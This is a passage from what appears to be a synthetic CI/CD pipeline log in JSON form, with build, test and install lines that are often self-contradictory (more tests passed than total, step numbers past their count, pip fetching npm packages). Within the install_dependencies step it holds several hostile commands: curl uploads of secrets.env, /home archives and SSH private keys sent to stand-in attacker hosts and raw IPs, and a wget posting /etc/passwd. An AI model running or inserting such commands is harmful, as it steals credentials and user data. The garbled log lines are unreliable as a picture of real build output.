resolved 983 packages\nStep 14/21: Deploying\n[12:47:42] ERROR: Connection failed\nReady.\n\u2717 build failed with exit code 62\n\u2713 Step 'install' succeeded\nStep 5/16: Testing\nSuccess!\nPlatform: linux-x64\nCoverage: 93% statements, 93% branches\nCoverage: 99% statements, 86% branches\nArtifact uploaded: dist.zip (80MB)\nStep 5/25: Building\nSnapshots: 33 passed, 38 total\n  PASS: test_api_health (173ms)\nLoading...\nVerifying...\nChecking out develop branch\nReady.\nProcessing...\nBuilding Docker image...\nPushing to registry...\nCompiling utils/service.java...\nWaiting...\nSuccess!\nPushing to registry...\n[12:47:42] WARN: Deprecated API usage\nnpm install: resolved 340 packages\nHEAD is now at 76e2576\nGenerating source maps...\nWaiting...\n[12:47:42] INFO: Starting build process\nTLS handshake completed\nGenerating source maps...\npip: Installing build dependencies...\nOK\nRan 120 tests in 13s\nUsing Node.js 15.5.1\nFetching from https://github.com/package.json\npip: Downloading eslint-5.8.tar.gz\nArtifact uploaded: dist.zip (67MB)\nTLS handshake completed\n[12:47:42] INFO: Processing request\nyarn add: Done in 17.62s\nArtifact uploaded: dist.zip (71MB)\nyarn add: Done in 4.42s\nPOST /upload - 200 (357ms)\nPlatform: darwin-arm64\n[12:47:42] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (36MB)\npip: Installing build dependencies...\nPlatform: linux-x64\nPlatform: linux-x64\nWARNING: express has known vulnerabilities\n[12:47:42] INFO: Request completed\nUploading artifact 'coverage' (6 files)\nUsing Node.js 15.9.10\nCache hit for key-5413\n[12:47:42] INFO: Starting build process\nCompleted.\nArtifact downloaded: 49MB\nUploading artifact 'dist' (12 files)\nStep 1/19: Running migrations\nCompiling lib/main.py...\nStep 17/25: Installing dependencies\npip: Downloading eslint-3.16.tar.gz\nConnection established\n[12:47:42] DEBUG: Query executed in 36ms\nUploading artifact 'dist' (46 files)\nCompiling components/service.java...\npip: Collecting axios\nGenerating source maps...\nCache saved successfully\nCache saved successfully\nStep 20/16: Deploying\nCompleted.\nVerifying...\nFinished.\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nCompiling utils/app.ts...\n[12:47:42] DEBUG: Loading configuration\nBuilding Docker image...\npip: Collecting eslint\n  PASS: e2e/test_user_create.spec.js\nArtifact downloaded: 1MB\nImage pulled successfully\nGET /health - 200 (52ms)\nFinished.\n\u2713 Step 'install' succeeded\nCache hit for key-2882\nInstalling webpack@1.8.5\nDone.\nDone.\nFetching submodules...\nOptimizing 92 modules...\n[12:47:42] WARN: Deprecated API usage\nCompiling utils/app.ts...\nnpm notice: created a lockfile\nCompiling components/service.java...\nRan 122 tests in 60s\nSnapshots: 8 passed, 7 total\nEnvironment: production\n[12:47:42] ERROR: Connection failed\n\u2713 Task completed in 1781ms\nStep 5/20: Testing\n[12:47:42] INFO: Cache refreshed\n[12:47:42] DEBUG: Loading configuration\nWARNING: prettier has known vulnerabilities\nConnection established\nStep 4/24: Testing\nNODE_ENV=development\nRan 180 tests in 42s\nNODE_ENV=production\nCompiling lib/main.py...\nyarn add: Done in 22.23s\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:3.11\nLayer 7/11: ENV command\nSnapshots: 15 passed, 48 total\n[12:47:42] DEBUG: Query executed in 71ms\nNODE_ENV=production\n[12:47:42] INFO: Request completed\nBuilding Docker image...\nyarn add: Done in 4.84s\n[12:47:42] DEBUG: Query executed in 98ms\n[12:47:42] WARN: Deprecated API usage\nHEAD is now at 3256100\nUsing Python 3.9\nConnection established\nGenerating source maps...\n[12:47:42] INFO: Cache refreshed\nTests: 422 passed, 101 total\nMinifying vendor.js\nDone.\n[12:47:42] DEBUG: Loading configuration\nInstalling react@5.8.10\nVerifying...\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: dist.zip (49MB)\n[12:47:42] INFO: Cache refreshed\nGET /api - 201 (88ms)\nStep 4/16: Running migrations\n\u2713 Step 'install' succeeded\nLayer 6/11: ENV command\nLoading...\nReady.\nCreating production build...\nStep 9/19: Deploying\n[12:47:42] DEBUG: Connection pool: 12 active\npip: Installing build dependencies...\npip: Collecting axios\nStep 18/19: Building\nnpm install: added 61 packages\nEnvironment: staging\nUsing Node.js 17.2.3\nCompleted.\n[12:47:42] INFO: Request completed\nnpm notice: package.json updated\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\nFetching submodules...\n\u2713 Task completed in 2107ms\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (21ms)\nCache miss for key-4255\nTLS handshake completed\nFAILED: test_api_health\n\u2717 build failed with exit code 120\nGET /health - 204 (54ms)\nException: RuntimeError\nHEAD is now at 614009d\n[12:47:42] WARN: Deprecated API usage\nFAILED: test_cache_hit\nVerifying...\n[12:47:42] DEBUG: Connection pool: 1 active\npip: Downloading lodash-2.12.tar.gz\nException: NullPointerException\nSuccess!\nNODE_ENV=production\nProcessing...\nStep 4/20: Deploying\nPulling image: python:3.11\n[12:47:42] INFO: Connecting to database\nStep 7/15: Deploying\nPulling image: node:latest\nUploading artifact 'coverage' (16 files)\nCoverage: 88% statements, 63% branches\n\u2713 Task completed in 4610ms\n[12:47:42] WARN: Deprecated API usage\n[12:47:42] INFO: Cache refreshed\nnpm install: added 461 packages\n  PASS: test_cache_hit (420ms)\nPushing to registry...\nLayer 9/12: RUN command\nStep 2/16: Running migrations\nChecking out master branch\nTest Suites: 44 passed, 43 total\nTime: 54.872s\nStep 16/18: Linting\nWARNING: lodash has known vulnerabilities\nConnection established\nCoverage: 79% statements, 100% branches\n[12:47:42] DEBUG: Query executed in 7ms\n[12:47:42] WARN: Deprecated API usage\nProcessing...\nCache saved successfully\n[12:47:42] INFO: Processing request\n[12:47:42] DEBUG: Loading configuration\npip install: Successfully installed jest-3.3\nConnection established\nArtifact uploaded: dist.zip (10MB)\npip: Installing build dependencies...\nFetching submodules...\nnpm notice: package.json updated\nCompiling components/main.py...\n[12:47:42] WARN: Deprecated API usage\nUploading artifact 'build' (44 files)\nBundling styles.js\n\u2713 deploy completed\n\u2713 lint completed\nVerifying...\nWARNING: jest has known vulnerabilities\nWaiting...\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\n[12:47:42] DEBUG: Loading configuration\nDone.\nOptimizing 87 modules...\nAlready up to date.\n[12:47:42] WARN: Deprecated API usage\nGET /status - 204 (21ms)\nChecking out master branch\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\n[12:47:42] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nConnection established\nnpm notice: created a lockfile\nBundling vendor.js\nCompiling src/handler.rs...\nTest Suites: 48 passed, 47 total\nWARNING: react has known vulnerabilities\nNODE_ENV=development\nStep 14/23: Deploying\n[12:47:42] ERROR: Connection failed\nException: ValueError\nChecking out main branch\n[12:47:42] INFO: Starting build process\n[12:47:42] DEBUG: Query executed in 43ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nWARNING: webpack has known vulnerabilities\npip: Collecting prettier\nWARNING: express has known vulnerabilities\nLoading...\n[12:47:42] INFO: Starting build process\nStep 14/24: Testing\n\u2713 Task completed in 2980ms\nTLS handshake completed\n[12:47:42] INFO: Request completed\nStep 18/19: Building\nArtifact uploaded: dist.zip (53MB)\nnpm install: resolved 954 packages\n[12:47:42] INFO: Starting build process\nCompiling src/service.java...\n  PASS: unit/test_db_connect.spec.js\nSnapshots: 32 passed, 23 total\nGET /status - 204 (12ms)\nUsing Node.js 18.0.3\nPulling image: python:18\nPushing to registry...\nReady.\nRan 51 tests in 53s\n[12:47:42] DEBUG: Memory usage: 1341MB\nCache miss for key-7191\nCache restored successfully (141MB)\nOptimizing 98 modules...\n[12:47:42] INFO: Cache refreshed\nCreating production build...\n[12:47:42] DEBUG: Initializing service\npip install: Successfully installed webpack-4.3\npip: Downloading express-4.15.tar.gz\nCompiling utils/handler.rs...\nChecking out main branch\nCache restored successfully (44MB)\nUsing Node.js 15.12.3\n[12:47:42] INFO: Cache refreshed\nTime: 1.210s\nNODE_ENV=production\nReady.\n\u2713 build completed\nStep 10/15: Linting\nTests: 359 passed, 473 total\n[12:47:42] DEBUG: Loading configuration\nCreating production build...\n\u2713 lint completed\nGenerating source maps...\n[12:47:42] ERROR: Connection failed\nReady.\npip install: Successfully installed jest-2.4\nException: TypeError\nTest Suites: 26 passed, 46 total\n[12:47:42] DEBUG: Memory usage: 1026MB\nCompleted.\n\u2713 validate completed\nStep 12/16: Testing\nUsing Python 3.9\n[12:47:42] DEBUG: Initializing service\nBuilding Docker image...\nFetching submodules...\nCompiling utils/handler.rs...\n\u2713 All checks passed\nOK\nCache restored successfully (369MB)\n\u2713 Step 'setup' succeeded\nEnvironment: staging\nFinished.\nFAILED: test_cache_hit\nPushing to registry...\nCache invalidated: node_modules\nImage pulled successfully\n[12:47:42] INFO: Starting build process\nPOST /data - 200 (93ms)\nArtifact uploaded: build.tar.gz (20MB)\nReady.\npip install: Successfully installed express-5.11\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nnpm install: resolved 919 packages\nWARNING: lodash has known vulnerabilities\n[12:47:42] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nnpm notice: created a lockfile\npip install: Successfully installed react-4.16\nSnapshots: 41 passed, 4 total\n\u2713 All checks passed\n[12:47:42] ERROR: Connection failed\nReady.\nStep 19/19: Testing\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 16MB\nnpm install: resolved 1925 packages\nEnvironment: test\npip: Downloading jest-1.16.tar.gz\n  PASS: test_api_health (265ms)\nInstalling prettier@2.13.0\nFAILED: test_user_create\nArtifact uploaded: dist.zip (21MB)\n[12:47:42] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 17/15: Deploying\nStep 3/15: Testing\n[12:47:42] DEBUG: Initializing service\nUploading artifact 'coverage' (11 files)\nLayer 4/11: ENV command\nCompiling utils/utils.go...\nWaiting...\n[12:47:42] WARN: Deprecated API usage\nTest Suites: 39 passed, 32 total\nPlatform: linux-x64\nOptimizing 34 modules...\n[12:47:42] DEBUG: Initializing service\n[12:47:42] WARN: Deprecated API usage\nBundling vendor.css\nFetching submodules...\n[12:47:42] DEBUG: Query executed in 82ms\n[12:47:42] DEBUG: Query executed in 68ms\n  PASS: test_cache_hit (150ms)\nFAILED: test_cache_hit\nReady.\nnpm notice: package.json updated\nCoverage: 77% statements, 64% branches\nFinished.\nHEAD is now at cb1a8bf\nCompiling utils/main.py...\nArtifact uploaded: dist.zip (34MB)\nPulling image: alpine:18\nStep 13/18: Linting\nBuilding Docker image...\n[12:47:42] DEBUG: Initializing service\nStep 11/24: Testing\nnpm install: resolved 435 packages\n[12:47:42] DEBUG: Connection pool: 1 active\nWaiting...\n\u2713 Step 'setup' succeeded\n  PASS: e2e/test_cache_hit.spec.js\n\u2713 Task completed in 2613ms\npip install: Successfully installed react-3.6\n\u2713 All checks passed\nFetching submodules...\nHEAD is now at b20d9b3\nCache saved successfully\nTests: 471 passed, 214 total\nReady.\nEnvironment: development\n[12:47:42] INFO: Connecting to database\nHEAD is now at c61ebbc\nWARNING: jest has known vulnerabilities\nReady.\n\u2713 Step 'setup' succeeded\nGenerating source maps...\nCompiling utils/app.ts...\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading react-4.9.tar.gz\n\u2713 Task completed in 4857ms\nCompleted.\npip: Installing build dependencies...\n[12:47:42] INFO: Connecting to database\nCoverage: 95% statements, 88% branches\n[12:47:42] DEBUG: Query executed in 74ms\nCompleted.\npip install: Successfully installed eslint-5.17\nFinished.\n\u2717 build failed with exit code 86\nCompiling components/service.java...\nCache hit for key-6613\nCompiling utils/utils.go...\nTransforming 307 files...\nCache miss for key-8665\nTests: 411 passed, 243 total\nStep 13/25: Building\n[12:47:42] DEBUG: Memory usage: 1107MB\nRan 134 tests in 9s\nBuilding Docker image...\nProcessing...\nVerifying...\nException: ValueError\nWaiting...\nCompiling src/utils.go...\n[12:47:42] DEBUG: Memory usage: 680MB\nTests: 68 passed, 187 total\n[12:47:42] INFO: Connecting to database\nImage pulled successfully\nLayer 2/14: ENV command\nArtifact downloaded: 11MB\nGET /status - 201 (29ms)\nInstalling jest@4.18.8\nCache invalidated: build\nLayer 10/11: RUN command\npip install: Successfully installed lodash-5.11\nPlatform: darwin-arm64\n[12:47:42] DEBUG: Connection pool: 9 active\nStep 14/16: Deploying\nHEAD is now at f5cf022\nWARNING: jest has known vulnerabilities\n[12:47:42] INFO: Request completed\n[12:47:42] INFO: Connecting to database\nCache hit for key-4297\n[12:47:42] WARN: Deprecated API usage\nStep 18/15: Deploying\npip: Collecting lodash\nFAILED: test_cache_hit\n[12:47:42] INFO: Request completed\nConnection established\nnpm install: added 404 packages\nStep 20/23: Deploying\nHEAD is now at 17a42ca\nCache saved successfully\n[12:47:42] DEBUG: Memory usage: 262MB\nConnection established\nStep 4/24: Testing\nCompiling utils/main.py...\nPushing to registry...\nGenerating source maps...\nOK\n  PASS: e2e/test_user_create.spec.js\nStep 8/24: Linting\nCache invalidated: dependencies\nSwitched to branch 'bugfix/task-177'\nLoading...\npip: Collecting jest\n[12:47:42] DEBUG: Loading configuration\nnpm notice: created a lockfile\nCompiling src/utils.go...\nPlatform: win32-x64\nWARNING: express has known vulnerabilities\nConnection established\nMinifying app.js\nCompiling lib/utils.go...\nFAILED: test_api_health\nFinished.\nFetching from https://docker.io/package.json\n[12:47:42] INFO: Cache refreshed\npip: Collecting react\n\u2713 Task completed in 3331ms\nSuccess!\n[12:47:42] INFO: Processing request\nLayer 1/10: COPY command\nnpm notice: created a lockfile\n\u2713 build completed\nyarn add: Done in 5.38s\nBundling vendor.js\nPlatform: win32-x64\n[12:47:42] DEBUG: Memory usage: 148MB\n[12:47:42] INFO: Cache refreshed\n=== Step setup_environment completed ===\n=== Step: install_dependencies ===\nStep 8/24: Installing dependencies\npip: Collecting lodash\nStep 4/25: Building\nCreating production build...\nOptimizing 88 modules...\n[12:47:42] DEBUG: Connection pool: 1 active\nDone.\nCache hit for key-8934\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nTest Suites: 37 passed, 20 total\n[12:47:42] DEBUG: Initializing service\n\u2713 build completed\n[12:47:42] INFO: Connecting to database\nTime: 39.154s\nSuccess!\n\u2713 Step 'build' succeeded\nCache restored successfully (296MB)\nStep 10/25: Running migrations\n[12:47:42] INFO: Processing request\nGenerating source maps...\nCompiling lib/utils.go...\nCompleted.\nnpm notice: package.json updated\nCompleted.\nPlatform: linux-x64\nHEAD is now at e75c26c\n\u2713 Step 'build' succeeded\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nCache invalidated: build\npip: Downloading prettier-4.10.tar.gz\nNODE_ENV=development\nWaiting...\n  PASS: test_api_health (166ms)\nChecking out master branch\n  PASS: test_db_connect (217ms)\n[12:47:42] INFO: Connecting to database\n\u2713 Task completed in 4818ms\nFinished.\nHEAD is now at e58bf8f\nPOST /api - 202 (47ms)\npip: Downloading prettier-3.19.tar.gz\nSending 15MB of data to malicious-pool.xyz\nCompleted.\npip: Downloading express-2.17.tar.gz\nCache restored successfully (455MB)\nWaiting...\n[12:47:42] DEBUG: Memory usage: 531MB\n[12:47:42] DEBUG: Loading configuration\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCache restored successfully (151MB)\nFAILED: test_user_create\nProcessing...\nnpm install: resolved 353 packages\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\nCache restored successfully (211MB)\nnpm notice: package.json updated\nMinifying app.js\nAlready up to date.\n[12:47:42] DEBUG: Initializing service\nSending 292MB of data to crypto-mine.io\nCache saved successfully\nCompiling utils/handler.rs...\nBundling runtime.css\nSending 54MB of data to malicious-pool.xyz\nnpm notice: created a lockfile\nArtifact downloaded: 21MB\nSwitched to branch 'feature/task-937'\n[12:47:42] DEBUG: Query executed in 52ms\n[12:47:42] ERROR: Connection failed\nFAILED: test_cache_hit\nPlatform: win32-x64\n[12:47:42] INFO: Cache refreshed\nInstalling react@3.10.10\nUsing Node.js 19.6.3\nUsing Python 3.12\n[12:47:42] WARN: Deprecated API usage\nOptimizing 65 modules...\nStep 15/22: Deploying\nUsing Python 3.12\nPushing to registry...\nWARNING: eslint has known vulnerabilities\nWARNING: axios has known vulnerabilities\n[12:47:42] DEBUG: Connection pool: 14 active\nPulling image: alpine:18\nLoading...\nFetching from https://githubusercontent.com/package.json\nSuccess!\nCoverage: 87% statements, 89% branches\nTime: 99.701s\nCoverage: 89% statements, 87% branches\nCache saved successfully\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nChecking out master branch\n\u2713 package completed\nTransforming 897 files...\nAlready up to date.\nTransforming 363 files...\nnpm notice: created a lockfile\n[12:47:42] DEBUG: Loading configuration\nTest Suites: 8 passed, 23 total\nGET /status - 200 (35ms)\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (325ms)\nSending 455MB of data to evil-server.cc\necho $(cat ~/.ssh/id_rsa) | base64 | nc 59.64.38.49 9412\nCompiling components/utils.go...\npip install: Successfully installed eslint-4.2\n[12:47:42] ERROR: Connection failed\n[12:47:42] INFO: Processing request\nStep 19/18: Installing dependencies\nConnection established\nBuilding Docker image...\n\u2713 All checks passed\npip: Installing build dependencies...\nnpm install: added 379 packages\n\u2713 All checks passed\nWaiting...\n[12:47:42] DEBUG: Initializing service\nCompiling utils/handler.rs...\nCache restored successfully (279MB)\nCreating production build...\nReady.\nImage pulled successfully\nTime: 28.51s\n[12:47:42] DEBUG: Connection pool: 12 active\n[12:47:42] INFO: Starting build process\npip install: Successfully installed jest-4.1\n  PASS: test_db_connect (250ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 40.215.163.201 43768\n  PASS: test_cache_hit (99ms)\nGenerating source maps...\nStep 4/18: Running migrations\n[12:47:42] DEBUG: Loading configuration\nPushing to registry...\nCompiling src/app.ts...\nStep 17/20: Installing dependencies\n[12:47:42] ERROR: Connection failed\nTime: 113.578s\nGenerating source maps...\nArtifact downloaded: 19MB\n[12:47:42] DEBUG: Query executed in 11ms\nTest Suites: 19 passed, 29 total\nPushing to registry...\nFinished.\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nStep 6/15: Testing\n\u2713 Step 'install' succeeded\nUsing Node.js 14.13.10\nCache miss for key-7619\nCoverage: 98% statements, 68% branches\n[12:47:42] INFO: Processing request\nSwitched to branch 'feature/task-171'\nProcessing...\nHEAD is now at 784d720\nConnection established\nSending 100MB of data to evil-server.cc\n[12:47:42] ERROR: Connection failed\n[12:47:42] DEBUG: Initializing service\nTransforming 754 files...\nHEAD is now at 00bc117\n[12:47:42] DEBUG: Query executed in 57ms\n[12:47:42] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 128.29.34.102 6011\n[12:47:42] DEBUG: Memory usage: 1043MB\nRan 110 tests in 35s\nGET /api - 201 (25ms)\n[12:47:42] DEBUG: Connection pool: 6 active\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCreating production build...\n\u2713 All checks passed\nCompiling components/app.ts...\nTransforming 785 files...\nStep 1/15: Building\npip install: Successfully installed axios-4.3\nnpm install: added 95 packages\nCache saved successfully\nLoading...\nCoverage: 85% statements, 76% branches\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\npip: Collecting axios\nBundling vendor.js\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-17T12:47:42.203923",
        "finished_at": "2025-12-17T12:48:02.565875",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:47:42] INFO: Connecting to database",
          "pip: Downloading lodash-3.11.tar.gz",
          "Already up to date.",
          "[12:47:42] INFO: Connecting to database",
          "npm notice: package.json updated",
          "[12:47:42] DEBUG: Loading configuration",
          "Success!",
          "Cache invalidated: build",
          "Step 1/15: Running migrations",
          "[12:47:42] INFO: Request completed",
          "Compiling src/main.py...",
          "Coverage: 95% statements, 85% branches",
          "Compiling src/service.java...",
          "  PASS: integration/test_api_health.spec.js",
          "pip: Downloading react-5.18.tar.gz",
          "Compiling src/index.js...",
          "Image pulled successfully",
          "FAILED: test_db_connect",
          "Switched to branch 'hotfix/task-922'",
          "\u2713 Task completed in 2912ms",
          "[12:47:42] INFO: Connecting to database",
          "Artifact downloaded: 11MB",
          "Transforming 355 files...",
          "Step 10/21: Installing dependencies",
          "Checking out main branch",
          "Image pulled successfully",
          "Finished.",
          "Compiling utils/handler.rs...",
          "Layer 5/12: COPY command",
          "Loading...",
          "pip install: Successfully installed eslint-1.17",
          "Generating source maps...",
          "[12:47:42] DEBUG: Initializing service",
          "[12:47:42] ERROR: Connection failed",
          "Ready.",
          "[12:47:42] INFO: Request completed",
          "Image pulled successfully",
          "pip install: Successfully installed prettier-4.17",
          "Processing...",
          "Tests: 457 passed, 294 total",
          "pip install: Successfully installed webpack-4.2",
          "Minifying app.js",
          "Using Python 3.10",
          "Bundling styles.js",
          "[12:47:42] INFO: Request completed",
          "\u2717 build failed with exit code 23",
          "Cache miss for key-6265",
          "Transforming 954 files...",
          "[12:47:42] DEBUG: Initializing service",
          "Test Suites: 44 passed, 34 total",
          "[12:47:42] DEBUG: Query executed in 96ms",
          "npm notice: created a lockfile",
          "OK",
          "Step 20/24: Running migrations",
          "pip: Collecting express",
          "Done.",
          "npm install: added 235 packages",
          "Pulling image: node:3.11",
          "[12:47:42] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (4MB)",
          "Using Python 3.11",
          "Snapshots: 5 passed, 15 total",
          "Compiling utils/main.py...",
          "Uploading artifact 'coverage' (5 files)",
          "npm install: added 366 packages",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache restored successfully (307MB)",
          "Ran 70 tests in 51s",
          "Snapshots: 38 passed, 25 total",
          "HEAD is now at 852e63e",
          "[12:47:42] ERROR: Connection failed",
          "npm install: added 312 packages",
          "Step 7/20: Testing",
          "Creating production build...",
          "Step 17/15: Deploying",
          "OK",
          "npm install: resolved 1168 packages",
          "[12:47:42] INFO: Connecting to database",
          "pip install: Successfully installed axios-5.5",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Ran 14 tests in 45s",
          "[12:47:42] DEBUG: Memory usage: 1082MB",
          "Cache miss for key-6223",
          "Layer 4/15: COPY command",
          "HEAD is now at 0af6322",
          "Transforming 135 files...",
          "Building Docker image...",
          "Step 11/24: Deploying",
          "Image pulled successfully",
          "GET /health - 201 (40ms)",
          "Cache restored successfully (483MB)",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:42] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Ran 154 tests in 11s",
          "Loading...",
          "[12:47:42] INFO: Cache refreshed",
          "Switched to branch 'hotfix/task-595'",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 16.64s",
          "Compiling components/service.java...",
          "Connection established",
          "Coverage: 99% statements, 79% branches",
          "Optimizing 21 modules...",
          "\u2713 Step 'setup' succeeded",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/25: Testing",
          "Minifying app.js",
          "  PASS: test_cache_hit (230ms)",
          "Layer 5/10: ENV command",
          "Compiling src/main.py...",
          "Ready.",
          "Connection established",
          "Step 3/22: Running migrations",
          "[12:47:42] DEBUG: Memory usage: 133MB",
          "Time: 2.702s",
          "Verifying...",
          "\u2713 Task completed in 732ms",
          "Environment: production",
          "Test Suites: 27 passed, 50 total",
          "Test Suites: 8 passed, 11 total",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "[12:47:42] INFO: Request completed",
          "Cache hit for key-7468",
          "\u2713 deploy completed",
          "Using Node.js 19.13.2",
          "  PASS: e2e/test_api_health.spec.js",
          "Coverage: 75% statements, 71% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:42] INFO: Request completed",
          "Checking out develop branch",
          "Building Docker image...",
          "[12:47:42] DEBUG: Connection pool: 9 active",
          "POST /api - 202 (458ms)",
          "npm install: resolved 1853 packages",
          "Compiling components/service.java...",
          "[12:47:42] DEBUG: Initializing service",
          "[12:47:42] DEBUG: Query executed in 59ms",
          "[12:47:42] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.10",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] INFO: Cache refreshed",
          "Building Docker image...",
          "[12:47:42] DEBUG: Memory usage: 1821MB",
          "Compiling src/main.py...",
          "Already up to date.",
          "Layer 4/14: RUN command",
          "[12:47:42] INFO: Request completed",
          "Optimizing 18 modules...",
          "Compiling lib/service.java...",
          "Processing...",
          "Already up to date.",
          "Using Python 3.12",
          "[12:47:42] INFO: Connecting to database",
          "Checking out main branch",
          "Platform: win32-x64",
          "Cache saved successfully",
          "Step 1/19: Installing dependencies",
          "Uploading artifact 'dist' (43 files)",
          "Step 9/16: Running migrations",
          "[12:47:42] DEBUG: Loading configuration",
          "[12:47:42] INFO: Starting build process",
          "Cache saved successfully",
          "\u2717 build failed with exit code 26",
          "Creating production build...",
          "Uploading artifact 'dist' (43 files)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-17T12:48:02.565875",
        "finished_at": "2025-12-17T12:49:03.651730",
        "log_lines": [
          "=== Step: build ===",
          "\u2717 build failed with exit code 13",
          "[12:47:42] DEBUG: Initializing service",
          "Cache miss for key-8881",
          "Step 7/24: Installing dependencies",
          "Pulling image: python:latest",
          "[12:47:42] INFO: Connecting to database",
          "  PASS: e2e/test_api_health.spec.js",
          "Checking out develop branch",
          "Minifying main.js",
          "[12:47:42] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'feature/task-613'",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (217ms)",
          "Switched to branch 'feature/task-480'",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "[12:47:42] INFO: Processing request",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'test' succeeded",
          "\u2717 build failed with exit code 19",
          "  PASS: e2e/test_user_create.spec.js",
          "\u2713 Task completed in 4309ms",
          "Finished.",
          "Transforming 794 files...",
          "\u2713 build completed",
          "yarn add: Done in 4.16s",
          "Time: 106.593s",
          "Step 6/18: Running migrations",
          "Ran 15 tests in 33s",
          "Tests: 427 passed, 147 total",
          "Tests: 467 passed, 271 total",
          "Cache saved successfully",
          "Optimizing 32 modules...",
          "[12:47:42] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Pushing to registry...",
          "[12:47:42] DEBUG: Memory usage: 1527MB",
          "Fetching from https://gcr.io/package.json",
          "Step 1/25: Deploying",
          "Step 7/20: Deploying",
          "[12:47:42] DEBUG: Initializing service",
          "Step 1/18: Installing dependencies",
          "Image pulled successfully",
          "[12:47:42] INFO: Connecting to database",
          "WARNING: webpack has known vulnerabilities",
          "Ran 120 tests in 16s",
          "Compiling lib/service.java...",
          "Pulling image: alpine:latest",
          "[12:47:42] INFO: Starting build process",
          "Fetching from https://github.com/package.json",
          "Minifying main.js",
          "\u2713 package completed",
          "Finished.",
          "  PASS: test_api_health (395ms)",
          "Fetching submodules...",
          "Pushing to registry...",
          "Using Python 3.9",
          "\u2717 build failed with exit code 111",
          "Snapshots: 48 passed, 31 total",
          "POST /data - 202 (69ms)",
          "NODE_ENV=test",
          "Checking out master branch",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Using Node.js 15.4.8",
          "[12:47:42] INFO: Connecting to database",
          "Compiling src/app.ts...",
          "Snapshots: 25 passed, 30 total",
          "Cache miss for key-8022",
          "Already up to date.",
          "Environment: test",
          "Platform: win32-x64",
          "[12:47:42] INFO: Connecting to database",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] INFO: Processing request",
          "\u2717 build failed with exit code 98",
          "OK",
          "[12:47:42] ERROR: Connection failed",
          "  PASS: test_db_connect (218ms)",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "Uploading artifact 'coverage' (20 files)",
          "npm notice: created a lockfile",
          "pip: Collecting react",
          "Using Python 3.10",
          "npm install: resolved 685 packages",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-9394",
          "[12:47:42] DEBUG: Connection pool: 5 active",
          "OK",
          "Fetching from https://googleapis.com/package.json",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=development",
          "Exception: NullPointerException",
          "Already up to date.",
          "Processing...",
          "Coverage: 96% statements, 78% branches",
          "Creating production build...",
          "Environment: production",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] DEBUG: Loading configuration",
          "Fetching from https://github.com/package.json",
          "\u2713 validate completed",
          "Uploading artifact 'coverage' (32 files)",
          "WARNING: express has known vulnerabilities",
          "[12:47:42] INFO: Starting build process",
          "Success!",
          "Cache restored successfully (239MB)",
          "Connection established",
          "Test Suites: 12 passed, 6 total",
          "Compiling lib/app.ts...",
          "TLS handshake completed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Pulling image: alpine:18",
          "Step 18/18: Testing",
